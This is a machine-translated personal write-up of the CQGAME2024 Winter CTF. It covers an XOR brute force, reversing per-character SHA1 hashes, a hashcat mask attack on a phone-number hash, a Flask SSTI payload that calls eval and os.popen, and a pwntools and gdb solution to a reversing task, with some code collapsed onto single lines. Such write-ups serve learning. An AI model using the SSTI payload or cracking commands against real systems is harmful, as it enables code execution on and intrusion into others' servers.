@@ -1,0 +1,300 @@
+---
+title: "CQGAME2024 Winter"
+date: 2025-01-19
+draft: false
+description: "CQGAME2024 Winter"
+summary: "CQGAME2024 Winter Personal WriteUP"
+tags: ["writeup", "ctf"]
+categories: ["writeup"]
+---
+
+{{< alert >}}
+**WARNING！** This is a machine translated version of the [Chinese page](/posts/cqgame2024_winter/)
+{{< /alert >}}
+
+## misc
+
+### Simple arithmetic
+
+> Think about XOR
+
+```
+ys~xdg/m@]mjkz@vl@z~lf>b
+```
+
+Run the script directly
+
+```python
+data = "ys~xdg/m@]mjkz@vl@z~lf>b"
+
+for shift in range(127):
+result = ""
+for i in range(len(data)):
+# print()
+result += chr(ord(data[i]) ^ shift)
+if result.startswith("flag"):
+print(result)
+exit(0)
+
+# print(result)
+
+# flag{x0r_Brute_is_easy!}
+```
+
+## Crypto
+
+### Are you Little Haas?
+
+> A young hacker named Xiao Fu participated in a CTF competition. He found that the content of the Little Haas file was highly regular and there was hidden information in the file name. He successfully found the hidden information and cracked the challenge. He said proudly: "Success lies in exploration and questioning. Collision is the key to discovering the truth!"
+
+```
+356a192b7913b04c54574d18c28d46e6395428ab
+da4b9237bacccdf19c0760cab7aec4a8359010b0
+77de68daecd823babbb58edb1c8e14d7106e83bb
+1b6453892473a467d07372d45eb05abc2031647a
+ac3478d69a3c81fa62e60f5c3696165a4e5e6ac4
+c1dfd96eea8cc2b62785275bca38ac261256e278
+902ba3cda1883801594b6e1b452790cc53948fda
+fe5dbbcea5ce7e2988b8c69bcfdfde8904aabc1f
+0ade7c2cf97f75d009975f4d720d1fa6c19f4897
+b6589fc6ab0dc82cf12099d1c2d40ab994e8410c
+3bc15c8aae3e4124dd409035f32ea2fd6835efc9
+21606782c65e44cac7afbb90977d8b6f82140e76
+22ea1c649c82946aa6e479e1ffd321e4a318b1b0
+aff024fe4ab0fece4091de044c58c9ae4233383a
+58e6b3a414a1e090dfc6029add0f3555ccba127f
+4dc7c9ec434ed06502767136789763ec11d2c4b7
+8efd86fb78a56a5145ed7739dcb00c78581c5375
+95cb0bfd2977c761298d9624e4b4d4c72a39974a
+51e69892ab49df85c6230ccc57f8e1d1606caccc
+042dc4512fa3d391c5170cf3aa61e6a638f84342
+7a81af3e591ac713f81ea1efe93dcf36157d8376
+516b9783fca517eecbd1d064da2d165310b19759
+4a0a19218e082a343a1b17e5333409af9d98f0f5
+07c342be6e560e7f43842e2e21b774e61d85f047
+86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
+54fd1711209fb1c0781092374132c66e79e2241b
+60ba4b2daa4ed4d070fec06687e249e0e6f9ee45
+d1854cae891ec7b29161ccaf79a24b00c274bdaa
+7a81af3e591ac713f81ea1efe93dcf36157d8376
+53a0acfad59379b3e050338bf9f23cfc172ee787
+042dc4512fa3d391c5170cf3aa61e6a638f84342
+a0f1490a20d0211c997b44bc357e1972deab8ae3
+53a0acfad59379b3e050338bf9f23cfc172ee787
+4a0a19218e082a343a1b17e5333409af9d98f0f5
+07c342be6e560e7f43842e2e21b774e61d85f047
+86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
+54fd1711209fb1c0781092374132c66e79e2241b
+c2b7df6201fdd3362399091f0a29550df3505b6a
+86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
+a0f1490a20d0211c997b44bc357e1972deab8ae3
+3c363836cf4e16666669a25da280a1865c2d2874
+4a0a19218e082a343a1b17e5333409af9d98f0f5
+54fd1711209fb1c0781092374132c66e79e2241b
+27d5482eebd075de44389774fce28c69f45c8a75
+5c2dd944dde9e08881bef0894fe7b22a5c9c4b06
+13fbd79c3d390e5d6585a21e11ff5ec1970cff0c
+07c342be6e560e7f43842e2e21b774e61d85f047
+395df8f7c51f007019cb30201c49e884b46b92fa
+11f6ad8ec52a2984abaafd7c3b516503785c2072
+84a516841ba77a5b4648de2cd0dfcb30ea46dbb4
+7a38d8cbd20d9932ba948efaa364bb62651d5ad4
+e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98
+d1854cae891ec7b29161ccaf79a24b00c274bdaa
+6b0d31c0d563223024da45691584643ac78c96e8
+5c10b5b2cd673a0616d529aa5234b12ee7153808
+4a0a19218e082a343a1b17e5333409af9d98f0f5
+07c342be6e560e7f43842e2e21b774e61d85f047
+86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
+54fd1711209fb1c0781092374132c66e79e2241b
+60ba4b2daa4ed4d070fec06687e249e0e6f9ee45
+54fd1711209fb1c0781092374132c66e79e2241b
+86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
+6b0d31c0d563223024da45691584643ac78c96e8
+58e6b3a414a1e090dfc6029add0f3555ccba127f
+53a0acfad59379b3e050338bf9f23cfc172ee787
+84a516841ba77a5b4648de2cd0dfcb30ea46dbb4
+22ea1c649c82946aa6e479e1ffd321e4a318b1b0
+e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98
+53a0acfad59379b3e050338bf9f23cfc172ee787
+042dc4512fa3d391c5170cf3aa61e6a638f84342
+a0f1490a20d0211c997b44bc357e1972deab8ae3
+042dc4512fa3d391c5170cf3aa61e6a638f84342
+a0f1490a20d0211c997b44bc357e1972deab8ae3
+53a0acfad59379b3e050338bf9f23cfc172ee787
+84a516841ba77a5b4648de2cd0dfcb30ea46dbb4
+11f6ad8ec52a2984abaafd7c3b516503785c2072
+95cb0bfd2977c761298d9624e4b4d4c72a39974a
+395df8f7c51f007019cb30201c49e884b46b92fa
+c2b7df6201fdd3362399091f0a29550df3505b6a
+3a52ce780950d4d969792a2559cd519d7ee8c727
+86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
+a0f1490a20d0211c997b44bc357e1972deab8ae3
+3c363836cf4e16666669a25da280a1865c2d2874
+4a0a19218e082a343a1b17e5333409af9d98f0f5
+54fd1711209fb1c0781092374132c66e79e2241b
+27d5482eebd075de44389774fce28c69f45c8a75
+5c2dd944dde9e08881bef0894fe7b22a5c9c4b06
+13fbd79c3d390e5d6585a21e11ff5ec1970cff0c
+07c342be6e560e7f43842e2e21b774e61d85f047
+395df8f7c51f007019cb30201c49e884b46b92fa
+11f6ad8ec52a2984abaafd7c3b516503785c2072
+84a516841ba77a5b4648de2cd0dfcb30ea46dbb4
+7a38d8cbd20d9932ba948efaa364bb62651d5ad4
+e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98
+d1854cae891ec7b29161ccaf79a24b00c274bdaa
+6b0d31c0d563223024da45691584643ac78c96e8
+5c10b5b2cd673a0616d529aa5234b12ee7153808
+3a52ce780950d4d969792a2559cd519d7ee8c727
+22ea1c649c82946aa6e479e1ffd321e4a318b1b0
+aff024fe4ab0fece4091de044c58c9ae4233383a
+58e6b3a414a1e090dfc6029add0f3555ccba127f
+4dc7c9ec434ed06502767136789763ec11d2c4b7
+8efd86fb78a56a5145ed7739dcb00c78581c5375
+95cb0bfd2977c761298d9624e4b4d4c72a39974a
+51e69892ab49df85c6230ccc57f8e1d1606caccc
+042dc4512fa3d391c5170cf3aa61e6a638f84342
+7a81af3e591ac713f81ea1efe93dcf36157d8376
+516b9783fca517eecbd1d064da2d165310b19759
+4a0a19218e082a343a1b17e5333409af9d98f0f5
+07c342be6e560e7f43842e2e21b774e61d85f047
+86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
+54fd1711209fb1c0781092374132c66e79e2241b
+60ba4b2daa4ed4d070fec06687e249e0e6f9ee45
+d1854cae891ec7b29161ccaf79a24b00c274bdaa
+7a81af3e591ac713f81ea1efe93dcf36157d8376
+53a0acfad59379b3e050338bf9f23cfc172ee787
+042dc4512fa3d391c5170cf3aa61e6a638f84342
+a0f1490a20d0211c997b44bc357e1972deab8ae3
+53a0acfad59379b3e050338bf9f23cfc172ee787
+4a0a19218e082a343a1b17e5333409af9d98f0f5
+07c342be6e560e7f43842e2e21b774e61d85f047
+86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
+54fd1711209fb1c0781092374132c66e79e2241b
+c2b7df6201fdd3362399091f0a29550df3505b6a
+356a192b7913b04c54574d18c28d46e6395428ab
+da4b9237bacccdf19c0760cab7aec4a8359010b0
+77de68daecd823babbb58edb1c8e14d7106e83bb
+1b6453892473a467d07372d45eb05abc2031647a
+ac3478d69a3c81fa62e60f5c3696165a4e5e6ac4
+c1dfd96eea8cc2b62785275bca38ac261256e278
+902ba3cda1883801594b6e1b452790cc53948fda
+fe5dbbcea5ce7e2988b8c69bcfdfde8904aabc1f
+0ade7c2cf97f75d009975f4d720d1fa6c19f4897
+b6589fc6ab0dc82cf12099d1c2d40ab994e8410c
+3bc15c8aae3e4124dd409035f32ea2fd6835efc9
+21606782c65e44cac7afbb90977d8b6f82140e76
+```
+
+Use hash-identifier to determine if it is sha1
+
+Use the script to run once to get the result
+
+```python
+import hashlib
+
+f = open("data.txt", "r")
+
+data = f.readlines()
+
+flag = ""
+for c in data:
+for i in range(128):
+hash = hashlib.sha1(str(chr(i)).encode()).hexdigest()
+if c.strip() == hash:
+flag += chr(i)
+# print(i, hash, c)
+
+print(flag)
+```
+
+> 1234567890-=qwertyuiopflag{no_is_flag}asdfghjklzxcvbnm,**flag{game_cqb_isis_cxyz}**.asdfghjklzxcvbnm,.qwertyuiopflag{no_is_flag}1234567890-=
+
+### The journey to hash
+
+> In Digital City, everyone communicates through digital phones, usually with 11-digit pure-blood numbers starting with 188. Alexander intercepted a special string "ca12fd8250972ec363a16593356abb1f3cf3a16d" in a special place. After checking, he found that this string was a bit similar to the scattered countries before, and it might be to the hash country. The young programmer Alexander was curious about this country and decided to decipher the hash value. After a period of exploration, Alexander succeeded in cracking it with his strong programming skills. After entering the corresponding string, he was instantly transferred to a fantasy data world. At the same time, Alexander also began his journey of further study. (Submission format: flag{11-digit number})
+
+Put ```ca12fd8250972ec363a16593356abb1f3cf3a16d``` in hash.txt and use hashcat to blast
+
+```shell
+hashcat -m 100 -a 3 hash 188?d?d?d?d?d?d?d?d --show
+```
+
+> ca12fd8250972ec363a16593356abb1f3cf3a16d:18876011645
+>
+> flag{18876011645}
+
+## WEB
+
+### easy_flask
+
+Use ```{{7*7}}``` to test and find SSTI
+
+This question does not have any filtering, just use it directly
+
+```
+{{().__class__.__base__.__subclasses__()[216].__init__.__globals__.__builtins__['eval']('__import__("os").popen("cat flag").read()')}}
+```
+
+## Reverse
+
+### ezre
+
+Some key logic:
+
+```C
+unsigned __int64 main_program()
+{
+unsigned int seed[2]; // [rsp+20h] [rbp-80h] BYREF
+__int64 v2; // [rsp+28h] [rbp-78h]
+char s[48]; // [rsp+30h] [rbp-70h] BYREF
+_BYTE s1[56]; // [rsp+60h] [rbp-40h] BYREF unsigned __int64 v5; // [rsp+98h] [rbp-8h] v5 = __readfsqword(0x28u); *(_QWORD *)seed = 0LL; v2 = 0LL; custom_md5_init(seed); srand(seed[0]); printf("Enter input: "); fgets(s, 43, stdin); if ( strlen(s) == 42 ) { memset(s1, 0, 0x2BuLL); xor_string_with_rand(s, s1); if ( !memcmp(s1, &ida_chars, 0x2BuLL) ) puts("right"); else puts("wrong"); } else { puts("Invalid input length."); } return v5 - __readfsqword(0x28u); } void __fastcall xor_string_with_rand(__int64 a1, __int64 a2) { int i; // [rsp+18h] [rbp-8h] for ( i = 0; i <= 41; ++i ) *(_BYTE *)(i + a2) = (rand() % 127) ^ *(_BYTE *)(i + a1);
+}
+```
+
+Analysis:
+
+The random seed is set in advance, so the random number generated each time is fixed
+I am too lazy to analyze the process of initializing the seed, but you can use dynamic debugging to obtain the initialized seed
+The XOR is used for encryption, so the original text can be obtained by XORing again
+The handwritten decryption script is garbled, I don’t understand it, so I directly use the original program to decrypt
+
+Specific ideas:
+
+Use IDA to extract the ciphertext, use the script to pass the ciphertext (including unprintable characters) into the program, and dynamically debug to obtain the ciphertext of the program XORing (decryption) again
+
+```python
+from pwn import *
+
+li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
+ll = lambda x : print('\x1b[01;38;5;1m'+ str(x) + '\x1b[0m')
+
+# Config
+LOCAL = True
+file = './ezre' remote_addr = 'localhost' remote_port = 65535 context.log_level='DEBUG' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARNING'] elf = ELF(file) context.binary = elf rop = ROP(elf) def dbg(p : process): if LOCAL: gdb.attach(p, 'x-pwn') def get_Process(): if LOCAL: p = process(file) else: p = remote(remote_addr,remote_port) return p def exp(): p = get_Process() # Real Start of EXP dbg(p) data = b"\x5C\x76\x4A\x78\x15\x62\x05\x7C\x6B\x21\x40\x66\x5B\x1A\x48\x7A\x1E\x46\x7F\x28\ x02\x75\x68\x2A\x34\x0C\x4B\x1D\x3D\x2E\x6B\x7A\x17\x45\x07\x75\x47\x27\x39\x78\x61" p.sendline(data)
+ p.interactive() flag = p.recvline_startswith(b'flag').decode()
+ li("[+] Got Flag!") print(flag)
+ p.close() if __name__ == '__main__':
+exp()
+
+# Principle: XOR twice to get the original text
+
+# gdb debugging operation:
+# b *main_program+153
+# c
+# n 20
+
+# gdb result:
+# ► 0x55a8ff6f34f9 <main_program+244> mov rsi, rcx RSI => 0x55a8ff6f6020 (ida_chars) ◂— 0x7c056215784a765c
+# 0x55a8ff6f34fc <main_program+247> mov rdi, rax RDI => 0x7fff23392bc0 ◂— 'flag{b799eb3a-59ee-4b3b-b49d-39080fc23e99|'
+# 0x55a8ff6f34ff <main_program+250> call memcmp@plt <memcmp@plt>
+
+```
+
+![Gdb Result](/img/posts/cqgame2024_winter/ezre_gdb_result.png)
+
+Verify again that the flag is correct:
+
+![confirm](/img/posts/cqgame2024_winter/ezre_confirm.png)
+
+> flag{b799eb3a-59ee-4b3b-b49d-39080fc23e99}
